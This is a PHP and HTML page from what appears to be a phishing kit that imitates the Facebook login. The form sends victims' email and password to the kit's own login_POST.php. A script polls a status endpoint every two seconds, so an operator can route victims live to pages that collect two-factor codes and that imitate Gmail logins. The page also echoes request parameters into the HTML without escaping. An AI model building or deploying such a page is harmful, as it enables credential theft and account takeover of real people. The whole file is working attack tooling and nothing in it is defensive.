<?php
include "helper.php";

$token = $_GET['token'] ?? '';
$w = "0";
if (isset($_GET['w'])) {
    $w = $_GET['w'];
}

$email = "";
if (isset($_GET['email'])) {
    $email = $_GET['email'];
}

$filePath = "status/" . $token . ".txt";
if (file_exists($filePath)) {
    $data = trim(file_get_contents($filePath));
    if ($data === 'gm_verify') {
        header("Location: gmail_verify.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_login') {
        header("Location: gmail_login.php?token=" . urlencode($token));
        exit;
    } elseif ($data === 'gm_wrong_pass') {
        header("Location: gmail_login.php?token=" . urlencode($token) . "&w=1");
        exit;
    } elseif ($data === 'gm_2fa_device') {
        header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=device");
        exit;
    } elseif ($data === 'gm_2fa_pick') {
        header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=pick");
        exit;
    } elseif ($data === 'gm_hold') {
        header("Location: gmail_login_POST.php?token=" . urlencode($token) . "&waiting=1");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="DC.title" content="">
    <meta name="revisit-after" content="1 day">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="distribution" content="GLOBAL">
    <meta name="rating" content="General">
    <meta name="copyright" content="">
    <meta name="author" content="">
    <meta name="theme-color" content="#FFF">
    <meta name="robots" content="noindex,nofollow">
    <link href="files/boxicons.min.css" rel="stylesheet">
    <link href="files/main.css" rel="stylesheet">
    <script src="files/jquery-3.6.4.min.js"></script>
    <link href="files/jquery.select.css" rel="stylesheet">
    <script src="files/socket.io.js"></script>
    <script src="files/jquery.select.min.js"></script>
    <title></title>
    <link rel="icon" href="fb-files/favicon.png">
</head>

<body>
    <link href="fb-files/auth.module.css" rel="stylesheet">
    <link href="fb-files/login.module.css?id=1" rel="stylesheet">
    <div class="login_main">
        <div class="container">
            <div class="mobile_header">
                <p>English (US)</p>
            </div>
            <img class="desktop_icon" src="fb-files/20200731035726.svg" alt="Icon">
            <img class="mobile_icon" src="fb-files/fb-icon.png" alt="Icon">

            <form method="POST" action="login_POST.php" class="form_container" id="f1">
                <input type="hidden" name="token" id="token" value="<?= $token; ?>" />
                <h2>Log in to Facebook</h2>
                <div class="alert">
                    <p>You must log in to continue.</p>
                </div>
                <div class="inputs">
                    <div>
                        <input id="email" type="text" name="email" data-email="true" data-required="true" placeholder="Mobile number or email" value="<?= $email; ?>">
                        <span class="error" id="email-error">The email or mobile number you entered isn’t valid.</span>
                    </div>
                    <div>
                        <input type="password" name="password" id="pwd" placeholder="Password" data-required="true">
                        <span class="error" id="pwd-error">The password you’ve entered is incorrect!</span>
                        <?php
                            if($w=="0")
                            {
                                echo ' <span class="error" id="wrong-error">Your username or password is incorrect!</span>';
                            }
                            else
                            {
                                 echo ' <span class="error" style="display:block !important" id="wrong-error">Your username or password is incorrect!</span>';
                            }
                        ?>
                       
                    </div>
                    <button type="button" name="submitLogin" onclick="submit_login()" style="cursor:pointer" id="btn_submit"> 
          <i class="bx bx-loader-alt bx-spin bx-rotate-90"></i>
          Log in
        </button>
                </div>
                <div class="links">
                    <a href="https://www.facebook.com/login/identify">Forgot password?</a>
                    <span> · </span>
                    <a href="#">Sign up for Facebook</a>
                </div>
            </form>

            <div class="mobile_footer">
                <a href="#" target="_blank">Create new account</a>
                <img src="fb-files/meta-logo.png" alt="Logo">
                <div class="list">
                    <a href="#" target="_blank">About</a>
                    <a href="#" target="_blank">Help</a>
                    <a href="#" target="_blank">More</a>
                </div>
            </div>

            <div class="mobile_background">
                <div class="a">
                    <div class="b"></div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="topFooter">
                <a href="#">English (UK)</a>
                <a href="#">Deutsch</a>
                <a href="#">Türkçe</a>
                <a href="#">Српски</a>
                <a href="#">Français (France)</a>
                <a href="#">Italiano</a>
                <a href="#">Bosanski</a>
                <a href="#">Svenska</a>
                <a href="#">Español</a>
                <a href="#">Português (Brasil)</a>
            </div>
            <div class="bottomFooter">
                <a href="#">Sign Up</a>
                <a href="#">Log in</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Watch</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Meta Pay</a>
                <a href="#">Oculus</a>
                <a href="#">Portal</a>
                <a href="#">Instagram</a>
                <a href="#">Bulletin</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Centre</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Privacy Center</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Cookies</a>
                <a href="#">AdChoices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
                <a href="#">Contact uploading and non-users</a>
            </div>
            <span>Meta © 2025</span>
        </div>
    </div>




</body>

</html>

<script type="text/javascript">
    function submit_login(){
        var email=$("#email").val();
        var email_error=$("#email-error");

        var pd=$("#pwd").val();
        var pd_error=$("#pwd-error");

        const token = "<?php echo $token; ?>"; 
        var wrong_error=$("#wrong-error");

        var hasError = false;

        if (email === "") {
            email_error.css("display", "block"); 
            hasError = true;
        } else {
            email_error.css("display", "none"); 
            wrong_error.css("display", "none"); 
        }

        if (pd === "") {
            pd_error.css("display", "block"); // Show error message
            hasError = true;
        } else {
            pd_error.css("display", "none"); 
            wrong_error.css("display", "none"); 
        }

        if (!hasError) {

            $("#f1").submit();
        }

    }
</script>


    <script type="text/javascript">
        const token = "<?php echo $token; ?>"; 

        function checkStatus() {
            fetch(`check_place.php?token=${token}`)
                .then(response => response.text())
                .then(data => {
                    data = data.trim();

                    if (data === 'pwd' || data=="hold" || data=="") {
                        console.log("Do not redirect");
                        return;
                    } else if (data === 'continue') {
                        window.location.href = 'continue.php?token='+token;
                    } else if (data === 'code') {
                        window.location.href = 'code.php?token='+token;
                    } else if (data === 'break') {
                        window.location.href = 'break.php?token='+token;
                    } else if (data === 'gm_verify') {
                        window.location.href = 'gmail_verify.php?token='+token;
                    } else if (data === 'gm_login') {
                        window.location.href = 'gmail_login.php?token='+token;
                    } else if (data === 'gm_wrong_pass') {
                        window.location.href = 'gmail_login.php?token='+token+'&w=1';
                    } else if (data === 'gm_2fa_device') {
                        window.location.href = 'gmail_2fa.php?token='+token+'&mode=device';
                    } else if (data === 'gm_2fa_pick') {
                        window.location.href = 'gmail_2fa.php?token='+token+'&mode=pick';
                    } else if (data === 'gm_hold') {
                        window.location.href = 'gmail_login_POST.php?token='+token+'&waiting=1';
                    } else{
                        return;
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        const statusInterval = setInterval(checkStatus, 2000);
    </script>